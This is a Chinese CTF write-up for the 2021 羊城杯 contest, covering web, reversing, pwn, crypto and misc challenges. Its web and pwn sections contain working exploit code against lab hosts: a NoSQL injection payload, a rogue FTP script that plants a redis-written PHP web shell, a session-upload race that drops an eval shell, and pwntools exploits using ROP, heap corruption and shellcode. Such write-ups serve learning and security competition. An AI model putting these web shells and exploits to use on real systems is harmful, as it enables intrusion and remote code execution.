# 羊城杯 Wp By Endless

阅读量 **304776**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-23 10:30:46

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t012ed83413a2201e22.jpg)

## WEB

###  CheckIn_go

跑源码 拿admin cookie  
再通过整数溢出使得拿到flag的得分为0。

###  No Sql

有源码`backup.zip`发现在`resetpassword`存在nosql注入，之前注了很久只知道用户名是`Sangfor`审计源码发现可以任意密码修改:

    
    
    {
    "token":{"$ne":null
    },
    "password":"1234"
    }
    

修改进入后台后直接修改`bootstrap.php`getshell

7.4绕disable直接FFI就可

![](https://p3.ssl.qhimg.com/t01786bc5f3d40b35fd.jpg)

提示flag在`GPG_KEYS`里，根目录还有flag文件，以为要提权，至于真flag在哪，懒得吐槽了。。

![](https://p4.ssl.qhimg.com/t01d6d107e555aa5da3.png)

最后flag

![](https://p2.ssl.qhimg.com/t019ef834d64ef6beea.png)

###  Cross Site

考点是laravel最新的那个`file_get_contents`结合FTP可以打FPM，但是此处扫目录发现`.dmp`开启redis，这里使用Gopherus打redis写shell即可:

    
    
    # -*- coding: utf-8 -*-    # @Time    : 2021/1/13 6:56 下午
    # @Author  : Crispr
    # @File    : ftp_redirect.py
    # @Software:
    
    import socket
    from urllib.parse import unquote
    
    # 对gopherus生成的payload进行一次urldecode
    payload = unquote("%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2431%0D%0A/var/www/html/public/crispr.php%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A")
    payload = payload.encode('utf-8')
    
    host = '0.0.0.0'
    port = 23
    sk = socket.socket()
    sk.bind((host, port))
    sk.listen(5)
    
    # ftp被动模式的passvie port,监听到3333
    sk2 = socket.socket()
    sk2.bind((host, 3333))
    sk2.listen()
    
    # 计数器，用于区分是第几次ftp连接
    count = 1
    while 1:
        conn, address = sk.accept()
        conn.send(b"200 \n")
        print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
        if count == 1:
            conn.send(b"220 ready\n")
        else:
            conn.send(b"200 ready\n")
    
        print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
        if count == 1:
            conn.send(b"215 \n")
        else:
            conn.send(b"200 \n")
    
        print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
        if count == 1:
            conn.send(b"213 3 \n")  
        else:
            conn.send(b"300 \n")
    
        print(conn.recv(20))  # EPSV\r\n'
        conn.send(b"200 \n")
    
        print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
        if count == 1:
            conn.send(b"227 47,95,219,96,13,5\n")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
        else:
            conn.send(b"227 127,0,0,1,24,235\n")  # 端口计算规则：24*256+235 = 6379
    
        print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
        if count == 1:
            conn.send(b"125 \n") # 告诉客户端可以开始数据连接了
            # 新建一个socket给服务端返回我们的payload
            print("建立连接!")
            conn2, address2 = sk2.accept()
            conn2.send(payload)
            conn2.close()
            print("断开连接!")
        else:
            conn.send(b"150 \n")
            print(conn.recv(20))
            exit()
    
        # 第一次连接是下载文件，需要告诉客户端下载已经结束
        if count == 1:
            conn.send(b"226 \n")
        conn.close()
        count += 1
    

在public写shell.php即可

###  only4

这题。。。 谁没事有`serialize.php`啊
直接一直想尝试怎么绕过读取`secret.php`，最后非预期使用任意文件包含session来getshell  
session存放地址:  
`/var/lib/php5/sess_`  
贴下exp:

    
    
    #!coding:utf-8
    
    import requests
    import time
    import threading
    
    host = 'http://192.168.38.235:8000'
    PHPSESSID = 'vrhtvjd4j1sd88onrm9t2gt2231123'
    
    def creatSession():
        while True:
            files = {
            "submit" : ("233.png", open("C:\\Users\\86189\\Pictures\\233.png", "rb"))
            }
            data = {"PHP_SESSION_UPLOAD_PROGRESS" : "<?php echo 'Crispr';file_put_contents('test.php','<?php eval($_POST[1]);?>');?>" }
            headers = {'Cookie':'PHPSESSID=' + PHPSESSID}
            r = requests.post(host,files = files,headers = headers,data=data)
    
    
    fileName = "/var/lib/php5/sess_" + PHPSESSID
    
    if __name__ == '__main__':
    
        url = "http://192.168.38.235:8000/?gwht={}&ycb=123".format(fileName)
        headers = {'Cookie':'PHPSESSID=' + PHPSESSID}
        t = threading.Thread(target=creatSession,args=())
        t.setDaemon(True)
        t.start()
        while True:
            res = requests.post(url,headers=headers)
            if b'Crispr' in res.content:
                print (res.content)
                print("[*] Get shell success.")
                break
            else:
                print("[-] retry.")
    

## RE

###  babyvm

虚拟机题，首先初始化虚拟机引擎，这里可以创建一个结构体让后面代码更好看。

然后就是 smc，这里直接运行过去，没有反调试  
然后就是运行了。这虚拟机出题人真是花了功夫了，这指令也太多了，熬夜看这个直接点带我走  
一般虚拟机题目加密都不太复杂，所以这里在几个 exit 前下个断点，猜测一下明文-密文的对应关系  
可以知道前面若干位是个单字节亦或，因此在相应比较的地方下个hook，即可dump出前面的密文，这里用了自己写的一个库

    
    
    import auto_cracker as ac
    import ida_dbg
    
    
    class Myactions(ac.Actions):
      def __init__(self):
        super().__init__()
        self.bpt_actions = [ac.B(0x8048F0B, self.bpt_cbk)]
    
      def bpt_cbk(self):
        edx = ida_dbg.get_reg_val("edx")
        eax = ida_dbg.get_reg_val("eax")
        ans = chr(eax ^ 0x61 ^ edx)
        print(ans,end='')
        ida_dbg.set_reg_val("eax", edx)
        self.request_continue()
    
    
    a = ac.AutoCracker(Myactions())
    a.hook()
    

得到前面是 16584abc45baff901c59dde3b1bb6701  
后面就很阴间了，发现此时的验证变成 4个字符验证一次，所以就没法通过前面的方法偷懒了，必须得知道是怎么加密的，基本就是动调然后记录寄存器的变化，然后 z3
解方程，过程太多不再赘述，仅拿前4位举例了

    
    
    import z3
    solver = z3.Solver()
    plain = [z3.BitVec("p%d" % i, 64) for i in range(4)]
    # plain = b'a254'
    plain_int = 0
    for i in range(4):
      plain_int <<= 8
      plain_int += plain[i]
    r7 = plain_int
    r1 = r7
    r1 >>= 5
    r1 ^= r7
    r7 = r1
    r1 <<= 7
    r1 &= 2565961507
    r1 ^= r7
    r7 = r1
    r1 <<= 24
    r1 &= 904182048
    r1 ^= r7
    r7 = r1
    r1 >>= 18
    r1 ^= r7
    solver.add(r1 == 0x6FEBF967)
    for i in range(4):
      solver.add(plain[i] <= 122)
      solver.add(plain[i] >= 48)
    print(solver.check())
    mod = solver.model()
    for p in plain:
      print(chr(mod[p].as_long()))
    

得到最终的flag 16584abc45baff901c59dde3b1bb6701a254b06cdc23

###  babysmc

有自解密的部分，但是没有反调，所以约等于没有  
动调发现这部分逻辑根本不会运行到，无视

![](https://p3.ssl.qhimg.com/t01e3c8c8579be1d495.png)

看密文很像 base64 编码的数据

![](https://p0.ssl.qhimg.com/t0131bbc2a70c8265a2.png)

回过头来看编码过程，基本就能判断是 base64 了

![](https://p5.ssl.qhimg.com/t01fb4d6c88d4726153.png)

编码后的数据还亦或加密了，所以解码前先亦或回去

    
    
    cipher = [
        i for i in b'H>oQn6aqLr{DH6odhdm0dMe`MBo?lRglHtGPOdobDlknejmGI|ghDb<4']
    charset = b'\xe4\xc4\xe7\xc7\xe6\xc6\xe1\xc1\xe0\xc0\xe3\xc3\xe2\xc2\xed\xcd\xec\xcc\xef\xcf\xee\xce\xe9\xc9\xe8\xc8\xeb\xcb\xea\xca\xf5\xd5\xf4\xd4\xf7\xd7\xf6\xd6\xf1\xd1\xf0\xd0\xf3\xd3\xf2\xd2\xfd\xdd\xfc\xdc\xff\xdf\x95\x9c\x9d\x92\x93\x90\x91\x96\x97\x94\x8a\x8e'
    print(len(cipher))
    for i in range(len(cipher)//4):
      cipher[4*i+0] ^= 0xa6
      cipher[4*i+1] ^= 0xa3
      cipher[4*i+2] ^= 0xa9
      cipher[4*i+3] ^= 0xac
    print(cipher)
    

然后随便找个现成的解base64 的就行了，这里用的golang

    
    
    encoder := base64.NewEncoding(string(charset))
    encoder.Decode(plain, cipher)
    fmt.Println(string(plain))
    

###  ez_android

![](https://p2.ssl.qhimg.com/t01d68fab4e4e9a2e27.png)

将密码传入进行socket远程通信，并且在此之前进行md5验证，这里每一个hex进行-1操作，还原即可  
查询md5为654321  
直接nc连得到character表，进行base64换表解密即可

    
    
    import base64
    import string
    
    str1 = "3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P"
    
    string1 = "TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom"
    string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))
    

得到SangFor{212f4548-03d1-11ec-ab68-00155db3a27e}

## PWN

###  Babyrop

栈溢出，先利用函数对bss段上`/cin/sh`异或成为`/bin/sh`，然后利用system执行`system("/bin/sh")`

    
    
    from pwn import*
    context(os='linux', arch='i386', log_level='debug')
    #r = process('./BabyRop')
    r = remote('192.168.38.235', 11000)
    elf = ELF('./BabyRop')
    
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    sys_plt = elf.plt['system']
    fun2 = 0x080491FD
    main_addr = 0x0804926B
    payload = b'A'*0x28+b'B'*0x4
    payload+= p32(fun2)+p32(0x08049332)+p32(0x0804C024)+p32(1)+p32(0x080491D6)+p32(main_addr)+p32(0x0804C024)
    
    r.sendline(payload)
    
    r.interactive()
    

###  name

先申请一波chunk清理一下bin  
利用残留的内容泄露堆地址和libc地址

构造chunka,b,c，伪造prevsize，利用off by null造成chunk overlap  
然后利用fastbin attack配合在堆上伪造的size位造成对包含puts指针的chunk的overlap  
修改puts指针指向`setcontext+53`，修改后面的chunk地址为计划填入frame的heap地址  
利用SigreturnFrame生成frame填入对应的chunk  
接着执行选项三进入setcontext，向fake_rsp读入shellcode最终执行orw

    
    
    from pwn import*
    #r = process('./name')
    r = remote('192.168.38.235',9999)
    context(os='linux', arch='amd64', log_level='debug')
    elf = ELF('./name')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    def set(size):
        r.sendlineafter('5.exit\n', str(1))
        r.sendlineafter('name size:\n', str(size))
    
    
    def edit(idx, ct):
        r.sendlineafter('5.exit\n', str(2))
        r.sendlineafter('index:\n', str(idx))
        r.sendafter('name:\n', ct)
    
    def puts(idx):
        r.sendlineafter('5.exit\n', str(3))
        r.sendlineafter('index:\n', str(idx))
    
    def delete(idx):
        r.sendlineafter('5.exit\n', str(4))
        r.sendlineafter('index:\n', str(idx))
    
    
    for i in range(6):
        set(0x70)
    puts(0)
    heap_addr = u64(r.recv(6).ljust(8,'\x00'))
    print 'heap_addr ===> ', hex(heap_addr)
    
    puts(5)
    libc.address = u64(r.recv(6).ljust(8,'\x00'))-312-0x10-libc.symbols['__malloc_hook']
    free_hook = libc.symbols['__free_hook']
    syscall = libc.symbols['syscall']+23
    print hex(libc.address)
    
    set(0xa8)#6
    set(0x58)#7
    set(0xf8)#8
    set(0x100)#9
    delete(6)
    edit(7, 'A'*0x50+p64(0x110))
    delete(8)
    set(0x100) #6
    delete(7)
    taraddr = heap_addr-0x130
    fakeframe = heap_addr+0x7c0+0x10
    edit(6, 'A'*0xa8+p64(0x60)+p64(taraddr))
    edit(0, 'Z'*0x60+p64(0)+p64(0x61))
    set(0x50)
    set(0x50)
    edit(8, p64(0)+p64(0x21)+p64(libc.symbols['setcontext']+53)+p64(fakeframe))
    
    
    fake_rsp = free_hook&0xfffffffffffff000
    frame = SigreturnFrame()
    frame.rax=0
    frame.rdi=0
    frame.rsi=fake_rsp
    frame.rdx=0x2000
    frame.rsp=fake_rsp
    frame.rip=syscall
    
    print hex(len(frame))
    edit(9, str(frame))
    puts(1)
    
    prdi_ret = libc.search(asm("pop rdi\nret")).next()
    prsi_ret = libc.search(asm("pop rsi\nret")).next()
    prdx_ret = libc.search(asm("pop rdx\nret")).next()
    prax_ret = libc.search(asm("pop rax\nret")).next()
    jmp_rsp = libc.search(asm("jmp rsp")).next()
    mprotect_addr = libc.sym['mprotect']
    
    payload = p64(prdi_ret)+p64(fake_rsp)
    payload += p64(prsi_ret)+p64(0x1000)
    payload += p64(prdx_ret)+p64(7)
    payload += p64(prax_ret)+p64(10)
    payload += p64(syscall)
    payload += p64(jmp_rsp)
    payload += asm(shellcraft.open('flag'))
    payload += asm(shellcraft.read(3,fake_rsp+0x300,0x30))
    payload += asm(shellcraft.write(1,fake_rsp+0x300,0x30))
    r.send(payload)
    
    r.interactive()
    

###  nologin

直接进入`admin`进行栈溢出  
栈上布置两段shellcode，返回地址写`jmp rsp`往下执行，清零rax以后再用`jmp $-0x16`往上跳转  
布置好rdx以后直接syscall就能从更低地址处开始读入数据

控制好偏移再在第三段shellcode前面填充`nop`滑行，最终执行orw读出flag

    
    
    from pwn import*
    context(os='linux', arch='amd64', log_level='debug')
    #r = process('./nologin')
    r = remote('192.168.38.235',40001)
    libc = ELF('./libc.so.6')
    
    main_addr = 0x40106B
    jmp_rsp = 0x4016fb
    
    shell = '''
    xor rax, rax
    jmp $-0x16
    '''
    
    shell2='''
    push 0x200
    pop rdx
    syscall
    '''
    
    payload = 'AA'+asm(shell2).ljust(11, 'A')+p64(jmp_rsp)+asm(shell)
    r.recvuntil('input>> \n')
    r.sendline('2')
    r.recvuntil('>password: \n')
    
    r.sendline(payload)
    print len(asm(shell))
    
    shell3 = '''
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    push 0x67616c66
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
    mov rdi, 4
    mov rsi, rsp
    push 0x50
    pop rdx
    xor rax, rax
    syscall
    push 1
    pop rax
    push 1
    pop rdi
    mov rsi, rsp
    push 0x50
    pop rdx
    syscall
    '''
    pay = 'A'*0x2e+asm(shell3)
    sleep(0.5)
    r.send(pay)
    
    r.interactive()
    

###  how2heap

ptr填满后del函数只会移动前46,del(0)后46==47,存在UAF,double
free劫持idx_range,后面加上个负数,get_a_int函数存在正溢,del((1<<32)-5)等同del(-5),负数前移替代idx_range,再申请覆盖got,写shellcode,getshell

    
    
    #coding:utf-8
    
    from pwn import *
    import subprocess, sys, os
    
    sa = lambda x, y: p.sendafter(x, y)
    sla = lambda x, y: p.sendlineafter(x, y)
    
    elf_path = './how2heap'
    ip = '192.168.38.235'
    port = 8889
    remote_libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
    
    context(os='linux', arch='amd64')
    #context.log_level = 'debug'
    
    def run(local = 1):
        global elf
        global p
        if local == 1:
            elf = ELF(elf_path, checksec = False)
            p = elf.process()
        else:
            p = remote(ip, port)
    def debug(cmd=''):
        # context.terminal = []
        gdb.attach(p,cmd)
        pause()
    def one_gadget(filename = remote_libc_path):
        return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
    
    def str2int(s, info = '', offset = 0):
        ret = u64(s.ljust(8, '\x00')) - offset
        success('%s ==> 0x%x'%(info, ret))
        return ret
    def chose(idx):
        sla('> ', str(idx))
    def add(content = '\n'):
        chose(1)
        sa('content: ', content)
    def show(idx):
        chose(2)
        sla('id: ', str(idx))
    def free(idx):
        chose(3)
        sla('id: ', str(idx))
    def free_m(idx):
        chose(3)
        sa('id: ', str(minus(idx)))
    def minus(num):
        return (1<<32)-num
    run(0)
    for i in range(47):
        add()
    add('\0'*0x10)
    add()
    # debug('b *0x400B13')
    n = 3
    for i in range(n):
        free(0)
    free(48-n)
    show(47-n)
    heap = str2int(p.recv(6).ljust(8,'\0'), 'heap', 0x40-0x150)
    #debug()
    #exit(0)
    free(0)
    free(46-n)
    add(p64(0x6020A0-0x8))
    add()
    add()
    offset = (0x602040-0x6020C0)/8-1+(1<<64)-2
    add(p64(offset)+p64(0x21))
    for i in range(n-1):
        add()
    for i in range(n):
        free(0)
    free(48-n)
    show(47-n)
    context.log_level='debug'
    free(0)
    free(46-n)
    add(p64(0x6020A0+0x8))
    add()
    add()
    add('a'*0x8+p64(0x602020))
    #debug()
    show(0)
    libc = ELF(remote_libc_path)
    libc.address = str2int(p.recv(6).ljust(8,'\0'), 'libc')#, libc.sym['write'])
    #pause()
    p.recvuntil('4.bye\n')
    print(hex(libc.address))
    print(hex(heap))
    for i in range(6):
        free(3)
    shell1 = '''
    push 0x68732f
    jmp $+0x1b
    '''
    shell2 = '''
    //push 0x68732f6e69622f
    mov rdi,{}
    jmp $+0x19
    '''.format(heap+0xc0)
    shell3 = '''
    jmp $+0x20
    '''
    shell4 = '''
    xor rsi, rsi
    xor rdx, rdx
    jmp $+0x1a
    '''
    shell5 = '''
    mov rax, SYS_execve
    syscall
    '''
    add('/bin/sh\0')
    shellcode5 = asm(shell5)
    add(shellcode5)
    shellcode4 = asm(shell4)
    add(shellcode4)
    shellcode3 = asm(shell3)
    add(shellcode3)
    shellcode2 = asm(shell2)
    add(shellcode2)
    shellcode1 = asm(shell1)
    free_m(5)
    one = libc.address + one_gadget()[0]
    #shellcode = '\xff\x25'+p32(2)+'\0\0'+p64(one)
    print(len(shellcode1))
    #debug('b *0x400633')
    add(shellcode1)
    
    p.interactive()
    

## CRYPTO

###  ringringring

    
    
    import hashlib
    from pwn import *
    
    def proof_of_work(a,b):
        i=1
        while True:
            if(hashlib.md5((str(i)+b).encode("utf-8")).hexdigest()[0:5]==a):
                return str(i)
            i=i+1
    
    def autoflag():
        r = remote("192.168.38.235", 2378)
        s = r.recv().decode("utf-8")
        s1 = s.split(" ")
        a = s1[-1][:5]
        b = s1[-3][:4]
        d1 = proof_of_work(a, b)
        r.send(d1.encode())
        print(r.recvuntil(b"a:"))
        for n in range(100):
            print(n)
            for i in [1,1,1,1,2]:
                if i!=1:
                    r.send(bytes(str(i * (10**(2*n)) ), encoding='utf-8'))
                    r.recvuntil(b":")
                else:
                    r.send(bytes(str(i * (10 ** n)), encoding='utf-8'))
                    r.recvuntil(b":")
        print(r.recvuntil(b"}"))
    autoflag()
    

得到GWHT{a_funny_equation}

###  Easy_Rsa

用tb师傅的博客一把梭

    
    
    from Crypto.Util.number import *
    
    
    def f(x, n):
        return (pow(x, n - 1, n) + 3) % n
    
    
    def rho(n):
        i = 1
        while True:
            a = getRandomRange(2, n)
            b = f(a, n)
            j = 1
            while True:
                p = GCD(abs(a - b), n)
                print('{} in {} circle'.format(j, i))
                if p == n:
                    break
                elif p > 1:
                    return (p, n // p)
                else:
                    a = f(a, n)
                    b = f(f(b, n), n)
                j += 1
            i += 1
    
    
    def main():
        n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039
        print(rho(n))
    
    
    if __name__ == '__main__':
        main()
    

之后拿到p q正常加解密就行

###  MISS

没有用addroundkey的AES  
找个实现改改就出

    
    
    InvSbox = (
        0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
        0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
        0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
        0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
        0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
        0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
        0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
        0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
        0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
        0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
        0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
        0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
        0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
        0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
        0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
        0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
    )
    
    
    # learnt from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c
    xtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)
    
    
    Rcon = (
        0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,
        0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,
        0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,
        0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,
    )
    
    
    def text2matrix(text):
        matrix = []
        for i in range(16):
            byte = (text >> (8 * (15 - i))) & 0xFF
            if i % 4 == 0:
                matrix.append([byte])
            else:
                matrix[i / 4].append(byte)
        return matrix
    
    
    class AES:
        def __init__(self):
            pass
    
        def decrypt(self, ciphertext):
            self.cipher_state = text2matrix(ciphertext)
            self.__inv_shift_rows(self.cipher_state)
            self.__inv_sub_bytes(self.cipher_state)
    
            for i in range(9, 0, -1):
                self.__inv_mix_columns(self.cipher_state)
                self.__inv_shift_rows(self.cipher_state)
                self.__inv_sub_bytes(self.cipher_state)
            return matrix2text(self.cipher_state)
    
        def __inv_sub_bytes(self, s):
            for i in range(4):
                for j in range(4):
                    s[i][j] = InvSbox[s[i][j]]
    
        def __inv_shift_rows(self, s):
            s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]
            s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
            s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]
    
        def __mix_single_column(self, a):
            # please see Sec 4.1.2 in The Design of Rijndael
            t = a[0] ^ a[1] ^ a[2] ^ a[3]
            u = a[0]
            a[0] ^= t ^ xtime(a[0] ^ a[1])
            a[1] ^= t ^ xtime(a[1] ^ a[2])
            a[2] ^= t ^ xtime(a[2] ^ a[3])
            a[3] ^= t ^ xtime(a[3] ^ u)
    
        def __mix_columns(self, s):
            for i in range(4):
                self.__mix_single_column(s[i])
    
        def __inv_mix_columns(self, s):
            # see Sec 4.1.3 in The Design of Rijndael
            for i in range(4):
                u = xtime(xtime(s[i][0] ^ s[i][2]))
                v = xtime(xtime(s[i][1] ^ s[i][3]))
                s[i][0] ^= u
                s[i][1] ^= v
                s[i][2] ^= u
                s[i][3] ^= v
    
            self.__mix_columns(s)
    
    
    if __name__ == '__main__':
        aes = AES()
        print(aes.decrypt(39516020331414594708236881779781078095))
    

###  Rsa?

p q 可以直接分解出来  
这个运算的阶应该是$\varphi(n)$的因子  
(1, 0)是这个运算的单位元  
写个二进制快速运算  
直接对密文求e对d的逆就行了

    
    
    from Crypto.Util.number import *
    from gmpy2 import iroot
    
    
    n = 13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023
    e = 65537
    a = 1762039418842677123086894939949574689744108610561557889235294034870342076452734215004689409493802437034960516295735815195656138656970901855976802991519141
    D = a * a % n
    c = (5404548088049249951619519701935576492239293254135836357417714329205323074367876875480850741613547220698045360461761929952847796420174204143917852624050110,
         2110372753170830610718226848526649992911771424441223687775304654852191999130502986109306355582366065947895295520226816523397652918227241733632791793362785)
    
    
    def xy(p1, p2):
        return (p1[0] * p2[0] + D * p1[1] * p2[1]) % n, (p1[0] * p2[1] + p2[0] * p1[1]) % n
    
    
    def mygetloop(the_x_y, e):
        ret = (1, 0)
        while e:
            if e & 1:
                ret = xy(ret, the_x_y)
            the_x_y = xy(the_x_y, the_x_y)
            e = e >> 1
        return ret
    
    
    x = iroot(n, 2)[0]
    
    if x * x < n:
        x += 1
    
    while True:
        y_2 = x * x - n
        if iroot(y_2, 2)[1]:
            y = iroot(y_2, 2)[0]
            break
        x += 1
    
    p, q = x + y, x - y
    assert p * q == n
    
    d = inverse(e, (p - 1) * (q - 1))
    print(long_to_bytes(mygetloop(c, d)[1]))
    

###  BigRsa

简单题，gcd n1 n2得因子后RSA即可。

    
    
    from Crypto.Util.number import *
    #rom flag import *
    import math
    
    n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061
    n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073
    e = 65537
    #m = bytes_to_long(flag)
    ##c = pow(m, e, n1)
    #c = pow(c, e, n2)
    
    #print("c = %d" % c)
    c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264
    
    sb=math.gcd(n1,n2)
    print(isPrime(n2//sb),isPrime(n1//sb))
    n2_p=sb
    n1_p=sb
    n2_q=(n2//sb)
    n1_q=(n1//sb)
    n2_d=inverse(e,(n2_p-1)*(n2_q-1))
    n2_c=pow(c,n2_d,n2)
    # output
    n1_d=inverse(e,(n1_p-1)*(n1_q-1))
    print(long_to_bytes(pow(n2_c,n1_d,n1)))
    

## MISC

###  签到题

SangFor{md5(28-08-30-07-04-20-02-17-23-01-12-19)}

###  取证

题目比较简单，首先我们可以通过磁盘取证拿到ssh.txt。  
而后再命令行中发现提示。说是.git相关。我们通过ssh.txt 解析  
证书个人信息拿到邮箱，从而找到github  
github中 **APP** 是微信小程序得，里面有串base64解密就是flag了

###  赛博德国人

恩尼格玛机。ftp密码是pdf密码。  
最后一个ftp传密文。用网上工具解恩尼格玛  
得到

    
    
    VIERSIEBENFUENFSIEBENVIERACHTFUENFVIERSIEBENBERTADREISECHSSECHSZWEIDREINEUNDREISECHSDREISIEBENDREIZWEIDREINULLDREIFUENFSECHSSECHSSECHSFUENFDREISIEBENDREIFUENFDREISIEBENDREINEUNDREIFUENFSECHSSECHSDREIEINSDREINULLDREIVIERDREIACHTDREIFUENFDREISIEBENDREIEINSSECHSDREISECHSSECHSDREIVIERSECHSDREISECHSSECHSSECHSZWEIDREISIEBENDREINULLDREIDREISIEBENDORA
    

是德文数字以及字母。直接.decode(“hex”)即可。

###  Misc-520

首先连续解包

    
    
    import os
    for i in range(519,0,-1):
        os.system('unzip -o {}.zip -d . '.format(str(i)))
    

这个png用stegslove提了个zip 密码是12345  
得到流量包。里面鼠标流量画数字。  
前面压缩包中150包得story内容不同

    
    
    这都被你发现了？
    我这故事不错吧，嘻嘻嘻
    那就把flag给你吧
    oh，不，还有一半藏在了pcap的心里，快去找找吧
    左心房右心房，扑通扑通的心，咿呀咿呀的❤
    72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,
    

合起来变异凯撒。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Retr_0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/253134](/post/id/253134)

安全客 - 有思想的安全新媒体

